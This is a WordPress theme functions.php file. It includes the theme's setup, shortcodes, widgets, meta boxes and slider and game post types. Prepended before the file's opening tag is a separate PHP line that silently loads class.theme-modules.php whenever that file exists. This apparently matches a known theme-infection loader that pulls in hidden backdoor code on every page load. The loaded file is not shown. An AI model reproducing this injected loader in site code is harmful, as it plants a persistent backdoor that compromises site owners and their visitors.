<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php


/*--------------------------------------------------------------*/
/*                   Theme Functions Here                       */                      
/*--------------------------------------------------------------*/


//---Theme Setup Options - Functions and Hooks
include('includes/theme-setup.php');

//---Adds Shortcodes
include('includes/theme-shortcodes.php');

//---Add Widgets
include('includes/theme-widgets.php');

//---Add Home Page Meta
include('includes/listings_meta_boxes.php');

//---Add Slides 
include('includes/slider_post_type.php');

//---Add Games
include('includes/games_post_type.php');
//---Add Home Page Meta
include('includes/home_meta_boxes.php');




/*--------------------------------------------------------------*/
/*                   Your Functions Below                       */                      
/*--------------------------------------------------------------*/
























?>